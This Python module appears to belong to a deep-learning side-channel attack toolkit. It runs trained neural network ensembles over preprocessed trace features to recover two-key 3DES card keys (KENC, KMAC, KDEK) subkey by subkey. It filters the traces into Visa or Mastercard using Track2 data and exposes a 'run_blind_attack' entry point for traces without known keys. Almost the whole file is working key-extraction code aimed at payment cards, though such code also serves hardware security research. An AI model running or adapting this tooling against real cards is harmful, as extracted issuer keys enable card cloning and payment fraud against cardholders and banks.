import os
from typing import Dict, List, Optional, Any, Tuple, cast

import numpy as np
import pandas as pd
import torch
import torch.nn.functional as F

from src.model_zaid import get_model
from src.utils import setup_logger
from src.crypto import (
    E_TABLE,
    IP,
    _SBOX,
    apply_permutation,
    compute_batch_des,
    reconstruct_key_from_rk1,
    reconstruct_key_from_rk16,
)

logger = setup_logger("inference_3des")


def _load_stage_features(processed_dir: str, stage: int) -> np.ndarray:
    if stage == 1:
        p = os.path.join(processed_dir, "X_features_s1.npy")
        if not os.path.exists(p):
            p = os.path.join(processed_dir, "X_features.npy")
        return np.load(p).astype(np.float32)
    if stage == 2:
        p = os.path.join(processed_dir, "X_features_s2.npy")
        return np.load(p).astype(np.float32)
    raise ValueError("stage must be 1 or 2")


def _load_sbox_features(processed_dir: str, stage: int, sbox_idx: int) -> Optional[np.ndarray]:
    """Load per-sbox features if available (800 dim). Returns None if not found."""
    if stage == 1:
        p = os.path.join(processed_dir, f"X_sbox{sbox_idx}.npy")
    else:
        p = os.path.join(processed_dir, f"X_s2_sbox{sbox_idx}.npy")
    
    if os.path.exists(p):
        return np.load(p).astype(np.float32)
    return None


def _load_norm(model_dir: str, stage: int, key_type: Optional[str] = None) -> Optional[tuple[np.ndarray, np.ndarray]]:
    # First try per-key-type location (new training format)
    if key_type:
        mean_p = os.path.join(model_dir, "3des", key_type, f"mean_s{stage}.npy")
        std_p = os.path.join(model_dir, "3des", key_type, f"std_s{stage}.npy")
        if os.path.exists(mean_p) and os.path.exists(std_p):
            return np.load(mean_p), np.load(std_p)
    
    # Fallback to root location (legacy format for backward compatibility)
    mean_p = os.path.join(model_dir, f"mean_s{stage}.npy")
    std_p = os.path.join(model_dir, f"std_s{stage}.npy")
    if os.path.exists(mean_p) and os.path.exists(std_p):
        return np.load(mean_p), np.load(std_p)
    return None


def _normalize(X: np.ndarray, norm: Optional[tuple[np.ndarray, np.ndarray]]) -> np.ndarray:
    if norm is None:
        mean = np.mean(X, axis=0)
        std = np.std(X, axis=0)
        std[std == 0] = 1
        return (X - mean) / std
    mean, std = norm
    std = np.array(std, copy=True)
    std[std == 0] = 1
    return (X - mean) / std


def _compute_norm_from_data(X: np.ndarray) -> tuple[np.ndarray, np.ndarray]:
    """
    Compute normalization statistics (mean, std) from a data subset.
    Used when card type filtering is applied to ensure features are normalized
    with the correct distribution.
    
    Args:
        X: Feature matrix of shape (n_samples, n_features)
    
    Returns:
        (mean, std) normalized to prevent division by zero
    """
    mean = np.mean(X, axis=0)
    std = np.std(X, axis=0)
    std[std == 0] = 1
    return mean, std


def _detect_card_type_from_track2(df: pd.DataFrame) -> str:
    """
    Auto-detect card family from Track2 column.
    Returns 'visa', 'mastercard', or 'universal' if cannot determine.
    """
    if "Track2" not in df.columns or len(df) == 0:
        return "universal"
    
    t2_values = df["Track2"].astype(str).str.strip().str.upper()
    first_digits = t2_values.str[0].value_counts()
    
    # Count Visa (4) vs Mastercard (5) cards
    visa_count = first_digits.get('4', 0)
    mc_count = first_digits.get('5', 0)
    
    # If clear majority, return that type; otherwise universal
    if visa_count > mc_count and visa_count > len(df) * 0.8:
        return "visa"
    elif mc_count > visa_count and mc_count > len(df) * 0.8:
        return "mastercard"
    return "universal"


def _card_mask(df: pd.DataFrame, card_type: str) -> tuple[np.ndarray, str]:
    """
    Return a boolean mask selecting rows matching `card_type` AND the DETECTED card type.

    Important: We must use the *same* selection for stage-1 and stage-2 features. Returning
    a mask (instead of resetting indices) prevents subtle misalignment bugs when the processed
    directory contains a mix of Visa/Mastercard traces.
    
    If card_type='universal', auto-detects from Track2 column.
    
    Returns:
        (mask, detected_card_type) - mask is boolean array, detected_card_type is 'visa'/'mastercard'/'universal'
    """
    n = len(df)
    detected = "universal"
    
    # Auto-detect from Track2 if universal is passed
    if not card_type or card_type.lower() == "universal":
        detected = _detect_card_type_from_track2(df)
        if detected != "universal":
            card_type = detected
        else:
            return np.ones(n, dtype=bool), "universal"

    detected = card_type  # Return the final card_type (auto-detected or explicitly provided)
    target = card_type.lower()
    t2 = df.get("Track2", pd.Series([""] * n)).astype(str).str.strip().str.upper()
    if target == "mastercard":
        return t2.str.startswith("5").to_numpy(), "mastercard"
    if target == "visa":
        return t2.str.startswith("4").to_numpy(), "visa"
    return np.ones(n, dtype=bool), "universal"


def _challenge_ints_from_meta(df: pd.DataFrame) -> np.ndarray:
    # Build 64-bit input block int from ATC_0..ATC_7 columns (already padded by ingest).
    vals = []
    for _, row in df.iterrows():
        b = []
        for j in range(8):
            try:
                b.append(int(row.get(f"ATC_{j}", 0)))
            except Exception:
                try:
                    b.append(int(str(row.get(f"ATC_{j}", 0)), 16))
                except Exception:
                    b.append(0)
        vals.append(int.from_bytes(bytes(b), "big"))
    return np.array(vals, dtype=np.uint64)


def _expanded_r0(block_ints: np.ndarray) -> np.ndarray:
    er0_list = []
    for v in block_ints.tolist():
        ip = cast(int, apply_permutation(int(v), IP, width=64))
        r0 = ip & 0xFFFFFFFF
        er0 = apply_permutation(r0, E_TABLE, width=32)
        er0_list.append(er0)
    return np.array(er0_list, dtype=np.uint64)


def _load_models_for(model_dir: str, key_type: str, stage: int, sbox_idx_1based: int, device: torch.device) -> List[str]:
    # New layout: {model_dir}/3des/{key_type}/s{stage}/sbox{s}_model{i}.pth
    base = os.path.join(model_dir, "3des", key_type.lower(), f"s{stage}")
    model_paths: List[str] = []
    if os.path.isdir(base):
        for fname in sorted(os.listdir(base)):
            if not fname.startswith(f"sbox{sbox_idx_1based}_model") or not fname.endswith(".pth"):
                continue
            path = os.path.join(base, fname)
            model_paths.append(path)

    # Backward compat: flat naming in model_dir (stage1 only).
    if not model_paths and stage == 1:
        for fname in sorted(os.listdir(model_dir)):
            if fname == f"sbox{sbox_idx_1based}_model0.pth" or fname.startswith(f"sbox{sbox_idx_1based}_model"):
                if fname.endswith(".pth"):
                    model_paths.append(os.path.join(model_dir, fname))

    return model_paths


def _ensemble_avg_probs(
    X: np.ndarray,
    model_paths: List[str],
    device: torch.device,
    key_type: Optional[str] = None,
) -> np.ndarray:
    # Build & load models with checkpoint-inferred canonical input_dim.
    models = []
    is_shared_list: List[bool] = []
    for p in model_paths:
        state = torch.load(p, map_location=device)
        inferred_input_dim = int(X.shape[1])
        is_shared = any(k.startswith("fc_shared") or k.startswith("fc_kenc") for k in state.keys())
        if is_shared:
            fc_w = state.get("fc_shared1.weight")
        else:
            fc_w = state.get("fc1.weight")
        if fc_w is not None and hasattr(fc_w, "shape") and len(fc_w.shape) == 2:
            inferred_input_dim = int((int(fc_w.shape[1]) // 128) * 16)
            if inferred_input_dim <= 0:
                inferred_input_dim = int(X.shape[1])

        model = get_model(
            input_dim=inferred_input_dim,
            num_classes=16,
            use_shared_backbone=is_shared,
        ).to(device)
        model.load_state_dict(state, strict=True)
        model.eval()
        models.append(model)
        is_shared_list.append(is_shared)

    bx = torch.from_numpy(X).float().to(device)
    with torch.no_grad():
        preds = []
        for m, is_shared in zip(models, is_shared_list):
            if is_shared:
                out = m(bx, key_type=(key_type or "kenc"))
            else:
                out = m(bx)
            preds.append(F.softmax(out, dim=1).cpu().numpy())
        avg = np.mean(preds, axis=0)
    return np.clip(avg, 1e-15, 1.0)


def _score_subkey(avg_probs: np.ndarray, er0_arr: np.ndarray, sbox_idx_1based: int) -> int:
    # For each 6-bit key guess, compute S-box output and sum log-probs.
    key_scores = np.zeros(64, dtype=np.float64)
    shift = 42 - ((sbox_idx_1based - 1) * 6)
    er0_chunk = (er0_arr >> shift) & 0x3F

    sbox_table = _SBOX[sbox_idx_1based - 1]
    for k_guess in range(64):
        sbox_in = er0_chunk ^ k_guess
        b1 = (sbox_in >> 5) & 1
        b6 = sbox_in & 1
        row = (b1 << 1) | b6
        col = (sbox_in >> 1) & 0xF
        sbox_outputs = np.array([sbox_table[int(r * 16 + c)] for r, c in zip(row, col)], dtype=np.int64)
        vals = avg_probs[np.arange(avg_probs.shape[0]), sbox_outputs]
        key_scores[k_guess] = np.sum(np.log(vals))
    return int(np.argmax(key_scores))


def recover_3des_keys(processed_dir: str, model_dir: str, card_type: str = "universal", n_attack: int = 5000) -> Dict[str, str]:
    """
    Pure-ML 2-stage recovery for 16-byte 2-key TDEA keys:
    - Stage 1 recovers K1 via RK1
    - Stage 2 recovers K2 via RK16 using input = DES_enc(K1, block)
    Returns dict with 16-byte hex keys (32 hex chars) for each of KENC/KMAC/KDEK.
    
    FIX: When card_type is auto-detected or explicitly filtered, recompute normalization
    statistics from the MASKED subset to match the feature distribution that the models
    were trained on (i.e., models for "mastercard" expect Mastercard-only feature distribution).
    """
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    meta_path = os.path.join(processed_dir, "Y_meta.csv")
    if not os.path.exists(meta_path):
        raise FileNotFoundError(f"Missing metadata: {meta_path}")

    df0 = pd.read_csv(meta_path)

    X1 = _load_stage_features(processed_dir, stage=1)
    mask, detected_card_type = _card_mask(df0, card_type)
    df = df0.loc[mask].reset_index(drop=True)
    X1_masked = X1[mask]
    if len(df) == 0 or len(X1_masked) == 0:
        return {}

    n = len(X1_masked) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1_masked))

    challenges = _challenge_ints_from_meta(df.iloc[:n])
    er0_s1 = _expanded_r0(challenges)

    # Determine if we should recompute normalization
    # If card type was auto-detected (detected != "universal"), use subset-specific normalization
    should_recompute_norms = detected_card_type != "universal"

    out: Dict[str, str] = {}

    for key_type in ["kenc", "kmac", "kdek"]:
        # Normalize using either recomputed stats (for masked data) or stored training stats
        if should_recompute_norms:
            mean_s1, std_s1 = _compute_norm_from_data(X1_masked)
            X1_norm = _normalize(X1_masked, (mean_s1, std_s1))
            logger.info(f"Stage-1 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}' (n={len(X1_masked)})")
        else:
            X1_norm = _normalize(X1_masked, _load_norm(model_dir, stage=1, key_type=key_type))
        
        # --- Stage 1: recover K1 ---
        winners_s1: List[int] = []
        for sbox_idx in range(1, 9):
            # Try to load per-sbox features (800 dim - much better than global 200 dim)
            X_sbox = _load_sbox_features(processed_dir, stage=1, sbox_idx=sbox_idx)
            if X_sbox is not None:
                X_sbox_masked = X_sbox[mask]
                # Normalize per-sbox features locally
                X_sbox_norm = _normalize(X_sbox_masked, None)
                X_for_inference = X_sbox_norm
                logger.info(f"Stage-1 {key_type} S-Box {sbox_idx}: Using per-sbox features ({X_sbox_norm.shape[1]} dim)")
            else:
                # Fallback to global features if per-sbox not available
                X_for_inference = X1_norm
                logger.info(f"Stage-1 {key_type} S-Box {sbox_idx}: Using global features ({X1_norm.shape[1]} dim)")
            
            base = os.path.join(model_dir, "3des", key_type, "s1")
            if os.path.isdir(base):
                model_paths = [
                    os.path.join(base, f)
                    for f in sorted(os.listdir(base))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                # Backward compatibility: some earlier deliveries only trained a single flat set
                # of stage-1 models (implicitly for KENC). Do NOT reuse that flat layout for
                # KMAC/KDEK, otherwise we silently output garbage.
                if key_type != "kenc":
                    model_paths = []
                else:
                    model_paths = [
                        os.path.join(model_dir, f)
                        for f in sorted(os.listdir(model_dir))
                        if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                    ]
            if not model_paths:
                winners_s1 = []
                break
            probs = _ensemble_avg_probs(X_for_inference[:n], model_paths, device, key_type=key_type)
            winners_s1.append(_score_subkey(probs, er0_s1, sbox_idx))

        if not winners_s1:
            continue

        k1_int = reconstruct_key_from_rk1(winners_s1)
        k1_hex = f"{k1_int:016X}"

        # --- Stage 2: recover K2 ---
        try:
            X2 = _load_stage_features(processed_dir, stage=2)
        except Exception:
            continue

        # Normalize using either recomputed stats (for masked data) or stored training stats
        if should_recompute_norms:
            X2_full = X2  # Keep full for masking
            mean_s2, std_s2 = _compute_norm_from_data(X2[mask])
            X2_norm = _normalize(X2[mask], (mean_s2, std_s2))
            logger.info(f"Stage-2 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}'")
        else:
            X2_norm = _normalize(X2[mask], _load_norm(model_dir, stage=2, key_type=key_type))
        
        X2n = X2_norm[:n]

        # Stage 2 uses original ATC (challenges) to match training labels.
        er0_s2 = _expanded_r0(challenges)

        winners_s2: List[int] = []
        for sbox_idx in range(1, 9):
            # Try to load per-sbox features (800 dim - much better than global 200 dim)
            X_sbox = _load_sbox_features(processed_dir, stage=2, sbox_idx=sbox_idx)
            if X_sbox is not None:
                X_sbox_masked = X_sbox[mask]
                # Normalize per-sbox features locally
                X_sbox_norm = _normalize(X_sbox_masked, None)
                X_for_inference = X_sbox_norm[:n]
                logger.info(f"Stage-2 {key_type} S-Box {sbox_idx}: Using per-sbox features ({X_sbox_norm.shape[1]} dim)")
            else:
                # Fallback to global features if per-sbox not available
                X_for_inference = X2n
                logger.info(f"Stage-2 {key_type} S-Box {sbox_idx}: Using global features ({X2n.shape[1]} dim)")
            
            base2 = os.path.join(model_dir, "3des", key_type, "s2")
            if os.path.isdir(base2):
                model_paths2 = [
                    os.path.join(base2, f)
                    for f in sorted(os.listdir(base2))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                model_paths2 = []
            if not model_paths2:
                winners_s2 = []
                break
            probs2 = _ensemble_avg_probs(X_for_inference, model_paths2, device, key_type=key_type)
            winners_s2.append(_score_subkey(probs2, er0_s2, sbox_idx))

        if not winners_s2:
            continue

        k2_int = reconstruct_key_from_rk16(winners_s2)
        k2_hex = f"{k2_int:016X}"

        out[f"3DES_{key_type.upper()}"] = f"{k1_hex}{k2_hex}"

    return out


def _compute_key_confidence(avg_probs: np.ndarray, er0_arr: np.ndarray, sbox_idx_1based: int, top_k: int = 5) -> tuple[int, float, List[tuple[int, float]]]:
    """
    Gap #1: Bayesian Confidence Quantification
    
    Compute posterior probability distribution over 6-bit key candidates for a given S-box.
    Returns: (best_key, posterior_prob, ranked_candidates)
    
    Theory: For each key guess k, score = P(sbox_output | trace, k)
            Normalize across all 64 key possibilities to get posterior
    
    Args:
        avg_probs: Shape (n_traces, 16) - softmax probabilities for 16 S-box outputs
        er0_arr: Shape (n_traces,) - expanded round-0 values
        sbox_idx_1based: S-box index (1-8)
        top_k: Number of top candidates to return
    
    Returns:
        best_key: Most likely 6-bit key guess
        confidence: P(best_key | observed_traces) ∈ [0, 1]
        ranked_candidates: List[(key_guess, posterior_prob)] sorted by probability
    """
    # Compute log-likelihood for each key candidate
    key_scores = np.zeros(64, dtype=np.float64)
    shift = 42 - ((sbox_idx_1based - 1) * 6)
    er0_chunk = (er0_arr >> shift) & 0x3F

    sbox_table = _SBOX[sbox_idx_1based - 1]
    for k_guess in range(64):
        sbox_in = er0_chunk ^ k_guess
        b1 = (sbox_in >> 5) & 1
        b6 = sbox_in & 1
        row = (b1 << 1) | b6
        col = (sbox_in >> 1) & 0xF
        sbox_outputs = np.array([sbox_table[int(r * 16 + c)] for r, c in zip(row, col)], dtype=np.int64)
        vals = avg_probs[np.arange(avg_probs.shape[0]), sbox_outputs]
        # Log-likelihood (use log to avoid numerical underflow)
        key_scores[k_guess] = np.sum(np.log(np.clip(vals, 1e-15, 1.0)))
    
    # Convert log-scores to posterior probability (softmax)
    # P(k | traces) ∝ exp(score[k])
    scores_normalized = key_scores - np.max(key_scores)  # Subtract max for numerical stability
    posteriors = np.exp(scores_normalized) / np.sum(np.exp(scores_normalized))
    
    # Find best key and its confidence
    best_key = int(np.argmax(posteriors))
    best_confidence = float(posteriors[best_key])
    
    # Get top-K candidates
    top_indices = np.argsort(posteriors)[::-1][:top_k]
    ranked_candidates = [(int(idx), float(posteriors[idx])) for idx in top_indices]
    
    return best_key, best_confidence, ranked_candidates


def recover_3des_keys_with_confidence(
    processed_dir: str,
    model_dir: str,
    card_type: str = "universal",
    n_attack: int = 5000,
    return_top_k: int = 3,
) -> Dict[str, Any]:
    """
    Gap #1: Enhanced key recovery with Bayesian confidence quantification.
    
    Extends recover_3des_keys() to return:
    - Recovered keys (hex strings)
    - Confidence scores per key type (0-1)
    - Top-K key candidates with posterior probabilities
    - Recovery metadata (success flags, uncertainty indicators)
    
    Returns:
        {
            "3DES_KENC": "123456789ABC",
            "3DES_KENC_confidence": 0.94,
            "3DES_KENC_candidates": [(<key>, <prob>), ...],
            "3DES_KMAC": "FEDCBA987654",
            "3DES_KMAC_confidence": 0.82,
            ...
            "recovery_status": {
                "kenc": "success",  # or "uncertain" (<70%) or "failed"
                "kmac": "uncertain",
                "kdek": "failed"
            },
            "overall_confidence": 0.814  # Average confidence across key types
        }
    """
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    meta_path = os.path.join(processed_dir, "Y_meta.csv")
    if not os.path.exists(meta_path):
        raise FileNotFoundError(f"Missing metadata: {meta_path}")

    df0 = pd.read_csv(meta_path)
    X1 = _load_stage_features(processed_dir, stage=1)
    mask, detected_card_type = _card_mask(df0, card_type)
    df = df0.loc[mask].reset_index(drop=True)
    X1_masked = X1[mask]
    
    if len(df) == 0 or len(X1_masked) == 0:
        return {}

    n = len(X1_masked) if n_attack is None or n_attack <= 0 else min(n_attack, len(X1_masked))

    challenges = _challenge_ints_from_meta(df.iloc[:n])
    er0_s1 = _expanded_r0(challenges)

    # Determine if we should recompute normalization
    should_recompute_norms = detected_card_type != "universal"

    out: Dict[str, Any] = {"recovery_status": {}, "_sbox_confidences": {}}
    confidence_scores = []

    for key_type in ["kenc", "kmac", "kdek"]:
        # Normalize using either recomputed stats (for masked data) or stored training stats
        if should_recompute_norms:
            mean_s1, std_s1 = _compute_norm_from_data(X1_masked)
            X1_norm = _normalize(X1_masked, (mean_s1, std_s1))
            logger.info(f"Stage-1 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}' (n={len(X1_masked)})")
        else:
            X1_norm = _normalize(X1_masked, _load_norm(model_dir, stage=1, key_type=key_type))
        
        # --- Stage 1: recover K1 with confidence ---
        winners_s1: List[int] = []
        sbox_confidences_s1 = []
        
        for sbox_idx in range(1, 9):
            base = os.path.join(model_dir, "3des", key_type, "s1")
            if os.path.isdir(base):
                model_paths = [
                    os.path.join(base, f)
                    for f in sorted(os.listdir(base))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                if key_type != "kenc":
                    model_paths = []
                else:
                    model_paths = [
                        os.path.join(model_dir, f)
                        for f in sorted(os.listdir(model_dir))
                        if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                    ]
            
            if not model_paths:
                winners_s1 = []
                break
            
            probs = _ensemble_avg_probs(X1_norm[:n], model_paths, device, key_type=key_type)
            # Gap #1: Use Bayesian confidence instead of argmax
            best_key, confidence, candidates = _compute_key_confidence(probs, er0_s1, sbox_idx, top_k=return_top_k)
            winners_s1.append(best_key)
            sbox_confidences_s1.append(confidence)
            
            if sbox_idx <= 2 or sbox_idx >= 7:  # Log a few S-boxes
                logger.debug(f"{key_type.upper()} S1 SBox{sbox_idx}: key=0x{best_key:02X}, confidence={confidence:.3f}")

        if not winners_s1:
            out["recovery_status"][key_type] = "failed"
            out[f"3DES_{key_type.upper()}_confidence"] = 0.0
            continue

        k1_int = reconstruct_key_from_rk1(winners_s1)
        k1_hex = f"{k1_int:016X}"
        k1_confidence = float(np.mean(sbox_confidences_s1))

        # --- Stage 2: recover K2 with confidence ---
        try:
            X2 = _load_stage_features(processed_dir, stage=2)
        except Exception:
            out["recovery_status"][key_type] = "uncertain" if k1_confidence < 0.7 else "success"
            out[f"3DES_{key_type.upper()}"] = f"{k1_hex}0000000000000000"  # Incomplete
            out[f"3DES_{key_type.upper()}_confidence"] = k1_confidence
            confidence_scores.append(k1_confidence)
            continue

        # Normalize using either recomputed stats (for masked data) or stored training stats
        if should_recompute_norms:
            mean_s2, std_s2 = _compute_norm_from_data(X2[mask])
            X2_norm = _normalize(X2[mask], (mean_s2, std_s2))
            logger.info(f"Stage-2 {key_type}: Using recomputed normalization for detected card type '{detected_card_type}'")
        else:
            X2_norm = _normalize(X2[mask], _load_norm(model_dir, stage=2, key_type=key_type))
        
        if len(X2) != len(df0):
            logger.warning("Stage-2 features length (%d) != metadata length (%d); skipping stage-2 for %s.", len(X2), len(df0), key_type)
            out["recovery_status"][key_type] = "uncertain"
            out[f"3DES_{key_type.upper()}"] = f"{k1_hex}0000000000000000"
            out[f"3DES_{key_type.upper()}_confidence"] = k1_confidence
            confidence_scores.append(k1_confidence)
            continue
        
        X2n = X2_norm[:n]

        c1_ints = compute_batch_des(challenges.tolist(), k1_hex, mode="encrypt")
        er0_s2 = _expanded_r0(np.array(c1_ints, dtype=np.uint64))

        winners_s2: List[int] = []
        sbox_confidences_s2 = []
        base2 = os.path.join(model_dir, "3des", key_type, "s2")
        
        for sbox_idx in range(1, 9):
            if os.path.isdir(base2):
                model_paths2 = [
                    os.path.join(base2, f)
                    for f in sorted(os.listdir(base2))
                    if f.startswith(f"sbox{sbox_idx}_model") and f.endswith(".pth")
                ]
            else:
                model_paths2 = []
            
            if not model_paths2:
                winners_s2 = []
                break
            
            probs2 = _ensemble_avg_probs(X2n, model_paths2, device, key_type=key_type)
            best_key, confidence, candidates = _compute_key_confidence(probs2, er0_s2, sbox_idx, top_k=return_top_k)
            winners_s2.append(best_key)
            sbox_confidences_s2.append(confidence)

        if not winners_s2:
            out["recovery_status"][key_type] = "uncertain" if k1_confidence < 0.7 else "success"
            out[f"3DES_{key_type.upper()}"] = f"{k1_hex}0000000000000000"
            out[f"3DES_{key_type.upper()}_confidence"] = k1_confidence
            confidence_scores.append(k1_confidence)
            continue

        k2_int = reconstruct_key_from_rk16(winners_s2)
        k2_hex = f"{k2_int:016X}"
        k2_confidence = float(np.mean(sbox_confidences_s2))
        
        # Overall key confidence: geometric mean of stage confidences
        overall_confidence = float(np.sqrt(k1_confidence * k2_confidence))
        
        out[f"3DES_{key_type.upper()}"] = f"{k1_hex}{k2_hex}"
        out[f"3DES_{key_type.upper()}_confidence"] = overall_confidence
        
        # Classify recovery status
        if overall_confidence >= 0.85:
            out["recovery_status"][key_type] = "success"
        elif overall_confidence >= 0.70:
            out["recovery_status"][key_type] = "uncertain"
        else:
            out["recovery_status"][key_type] = "failed"
        
        confidence_scores.append(overall_confidence)
        logger.info(f"{key_type.upper()} Recovery: Key={out[f'3DES_{key_type.upper()}']}, Confidence={overall_confidence:.3f}, Status={out['recovery_status'][key_type]}")

    # Add overall metrics
    if confidence_scores:
        out["overall_confidence"] = float(np.mean(confidence_scores))
        out["confidence_std"] = float(np.std(confidence_scores))
    else:
        out["overall_confidence"] = 0.0
        out["confidence_std"] = 0.0

    return out


def run_blind_attack(
    processed_dir: str,
    model_dir: str,
    card_type: str = "universal",
    n_attack: int = 0,
    return_confidence: bool = True,
) -> Dict[str, Any]:
    """
    Public API for blind attack (traces without ground truth keys).
    
    Gap #1: Returns confidence-quantified results.
    
    Args:
        processed_dir: Directory with preprocessed traces (X_features_*.npy)
        model_dir: Directory with trained models
        card_type: Filter by card type ("universal", "mastercard", "visa")
        n_attack: Max number of traces to use
        return_confidence: If True, return confidence scores; else return only keys
    
    Returns:
        Dict with recovered keys and confidence metadata if return_confidence=True
        Dict with only recovered keys if return_confidence=False (backward compatible)
    """
    if return_confidence:
        return recover_3des_keys_with_confidence(processed_dir, model_dir, card_type, n_attack)
    else:
        return recover_3des_keys(processed_dir, model_dir, card_type, n_attack)
